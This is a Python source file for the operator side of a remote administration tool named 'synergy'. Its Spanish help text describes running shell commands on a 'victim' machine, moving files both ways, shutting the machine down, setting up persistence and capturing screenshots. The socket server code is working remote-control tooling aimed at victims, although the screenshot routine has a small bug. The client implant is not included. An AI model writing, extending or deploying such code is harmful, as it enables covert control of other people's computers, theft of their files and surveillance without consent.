import base64
import json
from colorama import Fore, Style, init
import socket
import webbrowser
import os
import time

init()
fondo = '''

,d88~~\                                         /
8888    Y88b  / 888-~88e  e88~~8e  888-~\ e88~88e Y88b  /
`Y88b    Y888/  888  888 d888  88b 888    888 888  Y888/
 `Y88b,   Y8/   888  888 8888__888 888    "88_88"   Y8/
   8888    Y    888  888 Y888    , 888     /         Y
\__88P'   /     888  888  "88___/  888    Cb        /
        _/                                 Y8""8D _/ \n
                            Remote Administration Tool
'''
ayuda = '''
________________________________________________________________________________________________
Comando         |      Descripcion                                              
                |                                                               
ayuda           |    > Muestra este texto                                       
salir           |    > Cierra la conexion                                      
cd              |    > Cambia de directorio, ej: <cd /directorio/ejemplo>       
subida          |    > Sube archivos del servidor a la victima, ej: <subida /directorio/archivo               
descarga        |    > Descarga archivos desde la victima al servidor           
apagar          |    > Apaga la compu de la victima pero cirrea la concexion    
persistencia    |    > Ejecuta una persistencia                                 
google          |    > Abre links de Google Chrome                              
captura         |    > Toma una captura de pantalla de la victima                           
                                                                                
Si quieres ejecutar un comando de UNIX o MS-DOS, solo necesitas escribirlo          
________________________________________________________________________________________________
'''

print(Style.BRIGHT + Fore.LIGHTCYAN_EX + fondo)
print(Style.BRIGHT + Fore.BLUE + ayuda)
print(Style.RESET_ALL)


class Servidor:
    def __init__(self, ip, puerto):
        servidor = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        servidor.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        servidor.bind((ip, puerto))
        servidor.listen(0)
        print(Fore.LIGHTCYAN_EX + Style.BRIGHT +
              "> Esperando por una conexion" + Style.RESET_ALL)
        self.connection, direccion = servidor.accept()
        print(Fore.GREEN + Style.BRIGHT +
              "> Conexion recibida" + Style.RESET_ALL)
        self.username = self.datosRecibidos()

    def datosRecibidos(self):
        datosJson = b""
        while True:
            try:
                datosJson += self.connection.recv(1024)
                return json.loads(datosJson)
            except ValueError:
                continue

    def datosEnviados(self, datos):
        datosJson = json.dumps(datos)
        self.connection.send(datosJson.encode())

    def ejecutarRemoto(self, comando):
        self.datosEnviados(comando)
        if comando[0] == "salir":
            self.connection.close()
            exit()
        return self.datosRecibidos()

    def subirArchivo(self, ruta):
        with open(ruta, "rb") as file:
            return base64.b64encode(file.read())

    def descargarArchivos(self, ruta, contenido):
        with open(ruta, "wb") as file:
            file.write(base64.b64decode(contenido))

    def google(self, url):
        webbrowser.open_new_tab(url)
        try:
            webbrowser.get("chrome").open_new(url)
        except webbrowser.Error:
            pass
        return "El navegador se abrio correctamente"

    def captura(self):
        runtime = time.asctime()[11:].replace(' ', '-').replace(':', '-')
        if not os.path.isdir('output'):
            os.system('mkdir output')
        filename = 'output/screenshot-%s.png' %runtime
        self.connection.send()
        data = self.connection.recv(200000)
        with open(filename, 'wb') as img:
            img.write(data)
            img.close()
        return print('Captura guarda en: %s\n' %filename)

    def resultados(self, resultado):
        return resultado

    def run(self):
        while True:
            comando = input(Fore.GREEN + Style.BRIGHT + "synergy > " + Style.RESET_ALL)
            comando = comando.split(" ", 1)
            try:
                if comando[0] == "subida":
                    archivo = self.subirArchivo(comando[1]).decode()
                    comando.append(archivo)
                resultado = self.ejecutarRemoto(comando)

                if comando[0] == "descarga":
                    resultado = self.descargarArchivos(comando[1], resultado)

                if comando[0] == "google":
                    resultado = self.google(comando[1])

                if comando[0] == "captura":
                    resultado = self.captura()

                elif comando[0] == "ayuda":
                    print(Style.BRIGHT + Fore.BLUE + ayuda + Style.RESET_ALL)

            except Exception:
                resultado = Fore.RED + Style.BRIGHT + " Error el ejecutar el comando, checa la syntaxis" + Style.RESET_ALL
            print(self.resultados(resultado))


servidor = Servidor("127.0.0.1", 4444)
servidor.run()
